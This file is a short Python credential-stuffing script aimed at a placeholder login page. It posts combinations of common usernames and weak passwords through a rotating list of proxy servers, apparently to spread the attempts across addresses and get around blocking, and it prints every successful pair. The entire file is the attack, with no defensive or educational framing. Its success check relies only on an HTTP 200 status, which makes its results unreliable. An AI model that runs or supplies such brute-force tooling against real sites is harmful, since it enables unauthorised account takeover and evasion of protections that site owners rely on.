import requests

# target URL
target_url = 'http://example.com/login'

# list of proxy servers
proxies = [
    'http://proxy1.example.com:8080',
    'http://proxy2.example.com:8080',
    'http://proxy3.example.com:8080',
    'http://proxy4.example.com:8080',
    'http://proxy5.example.com:8080',
    'http://proxy6.example.com:8080',
    'http://proxy7.example.com:8080',
    'http://proxy8.example.com:8080',
    'http://proxy9.example.com:8080',
    'http://proxy10.example.com:8080',
]

# list of usernames and passwords to try
usernames = ['admin', 'user', 'root']
passwords = ['password1', 'password2', 'password123']

# Iterate proxy server
for proxy in proxies:
    # Create a session with the proxy server
    session = requests.Session()
    session.proxies = {'http': proxy}

    # Iterate over each combination of username and password
    for username in usernames:
        for password in passwords:
            # Make a POST request to the target URL with the current credentials
            response = session.post(target_url, data={'username': username, 'password': password})

            # Check if the login was successful
            if response.status_code == 200:
                print(f'Successful login with username: {username}, password: {password}, using proxy: {proxy}')
                # If the login was successful "code here"
                break
            else:
                print(f'Failed login attempt with username: {username}, password: {password}, using proxy: {proxy}')
